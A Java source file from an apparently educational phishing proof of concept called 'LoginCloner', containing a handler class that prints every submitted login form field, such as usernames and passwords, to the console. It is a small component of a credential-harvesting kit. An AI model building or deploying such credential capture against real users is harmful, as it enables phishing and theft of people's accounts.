package com.educational.poc.LoginCloner.server;

import java.util.Map;

/**
 * Handles received credentials by printing them to the console.
 */
public class ConsoleCredentialHandler implements ICredentialHandler {

    @Override
    public void handle(Map<String, String> formData) {
        if (formData == null || formData.isEmpty()) {
            System.out.println("\n----------------------------------------");
            System.out.println("Received empty login submission.");
            System.out.println("----------------------------------------\n");
            return;
        }

        System.out.println("\n----------------------------------------");
        System.out.println("Received login attempt:");
        formData.forEach((key, value) -> System.out.println(key + ": " + value));
        System.out.println("----------------------------------------\n");
    }
}